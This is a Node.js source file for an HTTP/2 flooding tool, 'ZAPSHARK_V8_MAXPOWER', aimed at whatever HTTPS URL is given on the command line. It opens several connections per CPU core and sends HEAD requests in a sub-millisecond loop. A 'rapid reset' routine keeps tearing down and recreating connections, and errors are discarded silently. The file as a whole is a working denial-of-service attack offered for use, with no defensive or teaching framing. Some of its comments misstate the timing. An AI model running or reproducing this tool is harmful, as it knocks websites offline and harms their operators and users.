const http2 = require('http2');
const os = require('os');

class ZAPSHARK_V8_MAXPOWER {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.totalRequests = 0;
        
        // CORE MANAGEMENT (Leave 2 cores free)
        this.totalCores = os.cpus().length;
        this.workerCount = Math.max(2, this.totalCores - 2);
        
        // CONNECTIONS PER WORKER
        this.connsPerWorker = 8;
        this.totalConnections = this.workerCount * this.connsPerWorker;
        
        // WORKER POOL
        this.workers = new Array(this.workerCount).fill(null).map(() => ({
            connections: [],
            lastCleanup: Date.now()
        }));
        
        // MEMORY MANAGEMENT
        this.gcInterval = 30000;
        this.lastGC = Date.now();
        this.requestChunks = 0;
        
        // ATTACK INTERVALS
        this.attackInterval = null;
        this.maintenanceInterval = null;
    }

    // === WORKER CONNECTION MANAGEMENT ===
    setupWorkerConnections(workerIndex) {
        const worker = this.workers[workerIndex];
        worker.connections = [];
        
        for (let i = 0; i < this.connsPerWorker; i++) {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 8192,
                    peerMaxConcurrentStreams: 100
                });
                
                client.setMaxListeners(50);
                client.on('error', () => {});
                
                worker.connections.push({
                    client,
                    requestCount: 0,
                    created: Date.now()
                });
                
            } catch (err) {
                // SILENT
            }
        }
    }

    initializeAllWorkers() {
        for (let i = 0; i < this.workerCount; i++) {
            setTimeout(() => {
                this.setupWorkerConnections(i);
            }, i * 50);
        }
    }

    // === MEMORY SAFE REQUEST ===
    sendRequests() {
        this.requestChunks++;
        
        // FORCE CLEANUP EVERY 50K REQUESTS
        if (this.requestChunks >= 50000) {
            this.cleanupStaleConnections();
            this.requestChunks = 0;
        }
        
        // EACH WORKER SENDS REQUESTS
        this.workers.forEach((worker, workerIndex) => {
            if (worker.connections.length === 0) return;
            
            // STREAMS PER WORKER
            const streams = Math.min(20, worker.connections.length * 3);
            
            for (let i = 0; i < streams; i++) {
                const conn = worker.connections[Math.floor(Math.random() * worker.connections.length)];
                if (!conn) continue;

                try {
                    const req = conn.client.request({
                        ':method': 'HEAD',
                        ':path': '/'
                    });
                    
                    conn.requestCount++;
                    
                    req.on('response', () => {
                        try { req.destroy(); } catch (e) {}
                    });
                    
                    req.on('error', () => {
                        try { req.destroy(); } catch (e) {}
                    });
                    
                    req.on('close', () => {
                        this.totalRequests++;
                    });
                    
                    req.end();
                    
                } catch (err) {
                    this.totalRequests++;
                }
            }
        });
    }

    // === MEMORY LEAK PREVENTION ===
    cleanupStaleConnections() {
        const now = Date.now();
        
        this.workers.forEach((worker, workerIndex) => {
            // CLEANUP EVERY 30s PER WORKER
            if (now - worker.lastCleanup >= 30000) {
                worker.connections = worker.connections.filter(conn => {
                    try {
                        // DESTROY CONNECTIONS WITH 50K+ REQUESTS OR 5+ MIN OLD
                        if (conn.requestCount >= 50000 || (now - conn.created) > 300000) {
                            conn.client.destroy();
                            return false;
                        }
                        return true;
                    } catch (err) {
                        return false;
                    }
                });
                
                // REFILL IF NEEDED
                while (worker.connections.length < this.connsPerWorker) {
                    try {
                        const client = http2.connect(this.targetUrl, {
                            maxSessionMemory: 8192
                        });
                        client.setMaxListeners(50);
                        client.on('error', () => {});
                        
                        worker.connections.push({
                            client,
                            requestCount: 0,
                            created: Date.now()
                        });
                    } catch (err) {}
                }
                
                worker.lastCleanup = now;
            }
        });
        
        // FORCE GARBAGE COLLECTION
        if (global.gc && now - this.lastGC >= this.gcInterval) {
            global.gc();
            this.lastGC = now;
        }
    }

    // === RAPID RESET (NO LOGGING) ===
    performRapidReset() {
        // RESET 1 WORKER AT A TIME (ROUND ROBIN)
        const workerIndex = Math.floor(Math.random() * this.workers.length);
        const worker = this.workers[workerIndex];
        
        if (worker && worker.connections.length > 0) {
            const connIndex = Math.floor(Math.random() * worker.connections.length);
            const conn = worker.connections[connIndex];
            
            if (conn) {
                try {
                    conn.client.destroy();
                    
                    const newClient = http2.connect(this.targetUrl, {
                        maxSessionMemory: 8192
                    });
                    newClient.setMaxListeners(50);
                    newClient.on('error', () => {});
                    
                    worker.connections[connIndex] = {
                        client: newClient,
                        requestCount: 0,
                        created: Date.now()
                    };
                } catch (err) {}
            }
        }
    }

    // === DISPLAY ONLY ===
    updateDisplay() {
        process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
    }

    // === MAIN - RUN FOREVER ===
    start() {
        this.initializeAllWorkers();
        
        setTimeout(() => {
            // RAPID RESET LOOP
            setInterval(() => {
                this.performRapidReset();
            }, 500); // 0.5ms
            
            // ATTACK LOOP
            this.attackInterval = setInterval(() => {
                this.sendRequests();
                this.updateDisplay();
            }, 0.1);
            
            // MAINTENANCE LOOP
            this.maintenanceInterval = setInterval(() => {
                this.cleanupStaleConnections();
            }, 10000);
            
        }, 3000);
        
        process.on('SIGINT', () => {
            clearInterval(this.attackInterval);
            clearInterval(this.maintenanceInterval);
            
            this.workers.forEach(worker => {
                worker.connections.forEach(conn => {
                    try { conn.client.destroy(); } catch (e) {}
                });
            });
            
            process.exit(0);
        });
    }
}

// USAGE
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    process.exit(1);
}

const shark = new ZAPSHARK_V8_MAXPOWER(target);
shark.start();
